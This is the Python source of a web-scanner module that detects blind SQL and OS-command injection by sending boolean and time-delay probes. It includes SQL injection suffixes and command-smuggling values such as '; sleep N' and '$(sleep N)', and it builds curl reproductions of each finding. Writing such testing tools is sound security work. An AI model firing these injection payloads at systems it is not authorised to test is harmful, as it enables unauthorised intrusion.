"""blind-oracle - detect BLIND injection (SQL / OS-command) that returns no error and no visible output.

Blind bugs are exactly what a quick manual pass and a naive scanner miss: the response looks identical whether or not
the payload worked. blind-oracle finds them two ways, per parameter, with YOUR session attached:

  * boolean-differential - send a TRUE condition and a FALSE condition; if the app answers them DIFFERENTLY (status or
    normalised length) while the TRUE answer tracks the baseline, the parameter is boolean-blind injectable.
  * time-differential - send a payload that sleeps N seconds; if the response time jumps by ~N, CONFIRM it by trying a
    different N and checking the delay SCALES (this rejects a slow-but-innocent endpoint). Catches time-blind SQLi and
    blind OS-command injection.

Non-destructive: every payload is a read-only SELECT/sleep - nothing is written, created or deleted. Run it against a
URL that carries query parameters, or a base URL with --data for a POST body; pass -H for auth.
"""
from __future__ import annotations

import time
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from ..core import http
from ..core import repro as repro_mod
from ..core.args import add_common_args, add_header_arg
from ..core.envelope import debug_logger, output_result

NAME = "blind-oracle"
KIND = "findings"
HELP = ("Detect blind SQL / OS-command injection across a request's parameters via boolean + time-based differential "
        "probes (session-aware, delay-scaling confirmation, non-destructive).")

# MATCHED (true, false) suffix pairs - identical syntax, differing ONLY in the boolean value, across quote contexts.
# A matched pair isolates the boolean: if the app answers them differently, it evaluated the condition -> injectable.
_BOOL = [("' AND '1'='1", "' AND '1'='2"),
         ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
         (" AND 1=1", " AND 1=2"),
         ("' AND '1'='1'-- -", "' AND '1'='2'-- -"),
         (") AND (1=1", ") AND (1=2")]
# time payloads as (label, payload-template with {N}); confirmed only if the delay SCALES with N.
_TIME = [("sqli-mysql", "' AND SLEEP({N})-- -"),
         ("sqli-mysql-num", " AND SLEEP({N})"),
         ("sqli-pg", "'||pg_sleep({N})--"),
         ("sqli-mssql", "';WAITFOR DELAY '0:0:{N}'--"),
         ("cmd-semicolon", "; sleep {N}"),
         ("cmd-pipe", "| sleep {N}"),
         ("cmd-subshell", "$(sleep {N})"),
         ("cmd-backtick", "`sleep {N}`")]


def add_arguments(parser) -> None:
    parser.add_argument("target", help="URL WITH query params (?id=1&q=x), or a base URL + --data for a POST body")
    parser.add_argument("--data", default=None, help="POST body (a=1&b=2); test these params instead of the query")
    parser.add_argument("--param", action="append", default=[], help="only test this param (repeatable); default all")
    parser.add_argument("--delay", type=int, default=5, help="seconds for the time-based probe (default 5)")
    parser.add_argument("--len-delta", type=float, default=0.30, help="min normalised length diff for boolean (0.30)")
    add_header_arg(parser)
    add_common_args(parser)


def _hdrs(args):
    h = {}
    for x in (getattr(args, "header", None) or []):
        if ":" in x:
            k, v = x.split(":", 1)
            h[k.strip()] = v.strip()
    return h


def _send(sess, method, base, params, timeout):
    """Send with `params` as query (GET) or form body (POST); return (status, norm_len, seconds)."""
    t0 = time.time()
    if method == "POST":
        r = http.send("POST", base, sess=sess, data=urlencode(params), timeout=timeout, allow_redirects=False,
                      headers={"Content-Type": "application/x-www-form-urlencoded"})
    else:
        pr = urlparse(base)
        url = urlunparse(pr._replace(query=urlencode(params)))
        r = http.send("GET", url, sess=sess, timeout=timeout, allow_redirects=False)
    dt = time.time() - t0
    body = r.get("body") or ""
    import re
    norm = re.sub(r"\d+", "#", re.sub(r"\s+", " ", body))     # digit/space-normalised so nonces don't add noise
    return r.get("status"), len(norm), dt


def _repro(method, base, params, args):
    """A replayable curl + raw request for the confirming param set (query for GET, form body for POST)."""
    hdrs = _hdrs(args)
    if method == "POST":
        return repro_mod.repro("POST", base, {**hdrs, "Content-Type": "application/x-www-form-urlencoded"},
                               urlencode(params))
    url = base + ("?" + urlencode(params) if params else "")
    return repro_mod.repro("GET", url, hdrs)


def run(args) -> int:
    dbg = debug_logger(args.debug)
    target = (args.target or "").strip()
    if not target.startswith(("http://", "https://")):
        target = "https://" + target
    method = "POST" if args.data else "GET"
    if method == "POST":
        base, params = target, dict(parse_qsl(args.data, keep_blank_values=True))
    else:
        pr = urlparse(target)
        base, params = urlunparse(pr._replace(query="")), dict(parse_qsl(pr.query, keep_blank_values=True))
    if not params:
        output_result([], args.output, "No parameters to test (give a URL with ?params or --data).")
        return 1
    names = [p for p in params if (not args.param or p in args.param)]
    sess = http.session(extra_headers=_hdrs(args))
    D = max(2, args.delay)

    b_status, b_len, b_time = _send(sess, method, base, params, timeout=D + 8)
    dbg(f"baseline: status={b_status} len={b_len} time={b_time:.2f}s")
    findings = []

    for name in names:
        orig = params.get(name, "")
        # ---- boolean-differential (3-way: TRUE should track the baseline, FALSE should diverge from it) ----
        def _like(s, l):                                  # response resembles the untouched baseline?
            return (s == b_status) and (abs(l - b_len) / max(b_len, 1) < 0.12)
        for t_pl, f_pl in _BOOL:
            tp = dict(params); tp[name] = f"{orig}{t_pl}"
            fp = dict(params); fp[name] = f"{orig}{f_pl}"
            ts, tl, _ = _send(sess, method, base, tp, timeout=D + 8)
            fs, fl, _ = _send(sess, method, base, fp, timeout=D + 8)
            if ts is None or fs is None:
                continue
            resp_differ = (ts != fs) or (abs(tl - fl) / max(tl, fl, 1) >= args.len_delta)
            # the boolean value FLIPS whether the response matches the baseline == the app evaluated the condition.
            if resp_differ and (_like(ts, tl) != _like(fs, fl)):
                findings.append({"severity": "high", "title": f"Blind boolean SQLi in '{name}'", "url": base,
                                 "info": f"param '{name}': base=[{b_status},{b_len}b], TRUE({t_pl})=>[{ts},{tl}b], "
                                         f"FALSE({f_pl})=>[{fs},{fl}b] - the true/false condition flips the result "
                                         f"vs baseline (boolean-blind SQLi).", **_repro(method, base, tp, args)})
                dbg(f"  BOOLEAN-BLIND '{name}' via {t_pl}")
                break
        # ---- time-differential (confirm by scaling) ----
        for label, tpl in _TIME:
            p1 = dict(params); p1[name] = f"{orig}{tpl.format(N=D)}"
            _, _, t1 = _send(sess, method, base, p1, timeout=D + 10)
            if t1 < b_time + D * 0.7:                         # no delay at N=D -> not this vector
                continue
            n2 = max(1, D // 2)                               # confirm: half the sleep should ~halve the delay
            p2 = dict(params); p2[name] = f"{orig}{tpl.format(N=n2)}"
            _, _, t2 = _send(sess, method, base, p2, timeout=D + 10)
            if (t1 - b_time) >= D * 0.7 and (t2 - b_time) >= n2 * 0.6 and (t1 - t2) >= (D - n2) * 0.5:
                cls = "SQL" if "sqli" in label else "OS-command"
                findings.append({"severity": "critical", "title": f"Blind time-based {cls} injection in '{name}'",
                                 "url": base,
                                 "info": f"param '{name}' [{label}]: sleep({D})=>{t1:.1f}s, sleep({n2})=>{t2:.1f}s, "
                                         f"base={b_time:.1f}s - delay SCALES with the requested sleep (confirmed time-blind).",
                                 **_repro(method, base, p1, args)})
                dbg(f"  TIME-BLIND '{name}' via {label} ({t1:.1f}s vs {t2:.1f}s)")
                break

    dbg(f"blind-oracle: {len(findings)} confirmed blind injection point(s)")
    output_result(findings, args.output)
    return 0
